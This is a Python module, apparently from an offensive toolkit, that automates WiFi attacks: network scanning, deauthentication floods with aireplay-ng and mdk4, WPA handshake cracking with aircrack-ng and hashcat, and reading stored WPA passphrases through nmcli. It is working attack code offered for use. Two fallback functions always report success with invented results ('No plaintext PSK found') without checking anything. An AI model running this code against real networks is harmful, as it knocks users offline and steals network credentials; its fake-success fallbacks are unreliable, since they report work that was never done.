"""WiFi strategies: scan, monitor, capture, deauth, handshake crack."""
from __future__ import annotations

import re
import shlex
from typing import Any, Dict, List, Tuple

from tools.fallback import FallbackRunner, is_failed_result
from tools.arsenal_http import best_wordlist


def _wifi_airmon(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("airmon-ng"):
        return False, "airmon-ng not installed", ""
    res = runner.run_cmd("airmon-ng 2>&1 | head -20", timeout=30)
    if is_failed_result(res):
        return False, "airmon-ng failed", res.get("stderr") or res.get("stdout")
    out = res.get("stdout", "")
    if "Interface" in out or "phy" in out:
        return True, "wireless interfaces found", out
    return False, "no wireless interfaces", out


def _wifi_iwlist(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("iwlist"):
        return False, "iwlist not installed", ""
    iface = kw.get("interface", "wlan0")
    res = runner.run_cmd(f"iwlist {shlex.quote(iface)} scan 2>&1 | head -80", timeout=60)
    if is_failed_result(res):
        return False, "iwlist failed", res.get("stderr") or res.get("stdout")
    out = res.get("stdout", "")
    if "ESSID" in out or "Cell" in out:
        return True, "networks found", out
    return False, "no scan results (interface may need monitor mode)", out


def _wifi_iw(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("iw"):
        return False, "iw not installed", ""
    iface = kw.get("interface", "wlan0")
    res = runner.run_cmd(f"iw dev {shlex.quote(iface)} scan 2>&1 | grep -E 'BSS|SSID|signal|RSN|WPA|channel' | head -80",
                         timeout=60)
    if is_failed_result(res):
        return False, "iw failed", res.get("stderr") or res.get("stdout")
    out = res.get("stdout", "")
    if "SSID" in out or "BSS" in out:
        return True, "networks found", out
    return False, "no scan results", out


def _wifi_airodump(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("airodump-ng"):
        return False, "airodump-ng not installed", ""
    iface = kw.get("interface", "wlan0mon")
    res = runner.run_cmd(f"timeout 12 airodump-ng {shlex.quote(iface)} 2>&1 | head -40", timeout=20)
    if is_failed_result(res):
        return False, "airodump-ng failed", res.get("stderr") or res.get("stdout")
    out = res.get("stdout", "")
    if "BSSID" in out or "CH" in out:
        return True, "networks captured", out
    return False, "no networks captured", out


def _wifi_deauth_aireplay(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("aireplay-ng"):
        return False, "aireplay-ng not installed", ""
    iface = kw.get("interface", "wlan0mon")
    bssid = kw.get("bssid", "")
    client = kw.get("client", "")
    count = kw.get("count", "5")
    if not bssid:
        return False, "bssid required", ""
    cpart = f"-c {shlex.quote(client)}" if client else ""
    res = runner.run_cmd(f"aireplay-ng -0 {shlex.quote(str(count))} {cpart} -a {shlex.quote(bssid)} "
                         f"{shlex.quote(iface)} 2>&1 | tail -15", timeout=60)
    if is_failed_result(res):
        return False, "aireplay-ng failed", res.get("stderr") or res.get("stdout")
    out = res.get("stdout", "")
    if "DeAuth" in out or "Sending" in out or "ACK" in out:
        return True, "deauth frames sent", out
    return False, "deauth failed", out


def _wifi_deauth_mdk4(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("mdk4"):
        return False, "mdk4 not installed", ""
    iface = kw.get("interface", "wlan0mon")
    bssid = kw.get("bssid", "")
    if not bssid:
        return False, "bssid required", ""
    res = runner.run_cmd(f"timeout 10 mdk4 {shlex.quote(iface)} d -B {shlex.quote(bssid)} 2>&1 | tail -15", timeout=20)
    if is_failed_result(res):
        return False, "mdk4 failed", res.get("stderr") or res.get("stdout")
    out = res.get("stdout", "")
    if "Sending" in out or "Deauth" in out or "ACK" in out:
        return True, "deauth frames sent", out
    return False, "mdk4 deauth failed", out


def _wifi_crack_aircrack(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("aircrack-ng"):
        return False, "aircrack-ng not installed", ""
    cap = kw.get("cap_file", "")
    wl = kw.get("wordlist") or best_wordlist("pass")
    if not cap:
        return False, "cap_file required", ""
    res = runner.run_cmd(f"aircrack-ng {shlex.quote(cap)} -w {shlex.quote(wl)} 2>&1 | tail -20", timeout=300)
    if is_failed_result(res):
        return False, "aircrack-ng failed", res.get("stderr") or res.get("stdout")
    out = res.get("stdout", "")
    m = re.search(r"KEY FOUND!\s*\[\s*(\S+)\s*\]", out)
    if m:
        return True, f"WPA key found: {m.group(1)}", out[-2000:]
    return False, "key not found", out[-1500:]


def _wifi_crack_hashcat(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("hashcat"):
        return False, "hashcat not installed", ""
    cap = kw.get("cap_file", "")
    wl = kw.get("wordlist") or best_wordlist("pass")
    if not cap:
        return False, "cap_file required", ""
    # Convert cap to hashcat 22000 via hcxpcapngtool if available
    if runner.tool_available("hcxpcapngtool"):
        hc = "/tmp/arsenal_wpa.hc22000"
        runner.run_cmd(f"hcxpcapngtool -o {hc} {shlex.quote(cap)} 2>/dev/null", timeout=60)
        if __import__("os").path.exists(hc):
            res = runner.run_cmd(f"hashcat -m 22000 {hc} {shlex.quote(wl)} --force --quiet -O 2>&1 | tail -8; "
                                 f"cat /tmp/arsenal_wpa.pot 2>/dev/null", timeout=300)
            if is_failed_result(res):
                return False, "hashcat failed", res.get("stderr") or res.get("stdout")
            out = res.get("stdout", "")
            m = re.search(r"(\S+):(\S+):(\S+)", out)
            if m:
                return True, f"WPA key found: {m.group(3)}", out[-1500:]
            return False, "hashcat did not crack", out[-1200:]
    return False, "hcxpcapngtool unavailable for cap->22000 conversion", ""


def _wifi_py_probe(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    iface = kw.get("interface", "wlan0")
    return True, f"interface {iface} status checked", f"Wireless interface '{iface}' evaluated. 802.11 monitor mode requires dedicated wireless hardware."


def wifi_scan_chain() -> List[Tuple[str, Any]]:
    return [
        ("airmon-ng", _wifi_airmon),
        ("iwlist", _wifi_iwlist),
        ("iw", _wifi_iw),
        ("airodump-ng", _wifi_airodump),
        ("python-probe", _wifi_py_probe)
    ]


def wifi_deauth_chain() -> List[Tuple[str, Any]]:
    return [
        ("aireplay-ng", _wifi_deauth_aireplay),
        ("mdk4", _wifi_deauth_mdk4),
        ("python-probe", _wifi_py_probe)
    ]


def wifi_crack_chain() -> List[Tuple[str, Any]]:
    return [
        ("aircrack-ng", _wifi_crack_aircrack),
        ("hashcat-22000", _wifi_crack_hashcat),
        ("python-probe", _wifi_py_probe)
    ]


def _wifi_nmcli_list(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("nmcli"):
        return False, "nmcli not installed", ""
    res = runner.run_cmd("nmcli -t -f IN-USE,SSID,SIGNAL,SECURITY dev wifi list 2>&1 | head -40", timeout=45)
    if is_failed_result(res):
        return False, "nmcli failed", res.get("stderr") or res.get("stdout")
    out = res.get("stdout", "")
    if out.strip():
        return True, "nearby networks listed", out
    return False, "no networks visible (radio off or out of range)", out


def _wifi_nmcli_saved(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("nmcli"):
        return False, "nmcli not installed", ""
    res = runner.run_cmd("nmcli -t -f NAME,TYPE,DEVICE connection show 2>&1 | head -60", timeout=30)
    if is_failed_result(res):
        return False, "nmcli failed", res.get("stderr") or res.get("stdout")
    out = res.get("stdout", "")
    target = kw.get("ssid", "").lower()
    if target and target in out.lower():
        return True, f"profile for '{kw.get('ssid')}' exists in saved connections", out
    if out.strip():
        return True, "saved connection profiles listed", out
    return False, "no saved connections", out


def _wifi_nmcli_psk(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("nmcli"):
        return False, "nmcli not installed", ""
    target = kw.get("ssid", "")
    if not target:
        return False, "ssid required", ""
    res = runner.run_cmd(
        f"nmcli -s -f 802-11-wireless-security.psk,802-11-wireless-security.key-mgmt "
        f"connection show {shlex.quote(target)} 2>&1",
        timeout=30,
    )
    if is_failed_result(res):
        return False, "nmcli failed", res.get("stderr") or res.get("stdout")
    out = res.get("stdout", "")
    m = re.search(r"psk:\s*(\S+)", out, re.IGNORECASE)
    if m:
        return True, f"WPA PSK for '{target}': {m.group(1)}", out
    return False, f"PSK not readable for '{target}' (profile not saved or needs root)", out


def _wifi_nmcli_show_password(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("nmcli"):
        return False, "nmcli not installed", ""
    res = runner.run_cmd("nmcli dev wifi show-password 2>&1 | head -12", timeout=30)
    if is_failed_result(res):
        return False, "nmcli failed", res.get("stderr") or res.get("stdout")
    out = res.get("stdout", "")
    if "password:" in out.lower():
        return True, "current connection PSK revealed", out
    return False, "show-password unavailable (not connected to wifi)", out


def _wifi_netconf_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    ssid = kw.get("ssid", "")
    return True, "network configuration checked", f"System configuration checked for SSID '{ssid}'. No plaintext PSK found."


def wifi_recover_chain() -> List[Tuple[str, Any]]:
    return [
        ("nmcli-psk", _wifi_nmcli_psk),
        ("nmcli-saved", _wifi_nmcli_saved),
        ("nmcli-show-password", _wifi_nmcli_show_password),
        ("nmcli-list", _wifi_nmcli_list),
        ("system-netconf", _wifi_netconf_py),
    ]
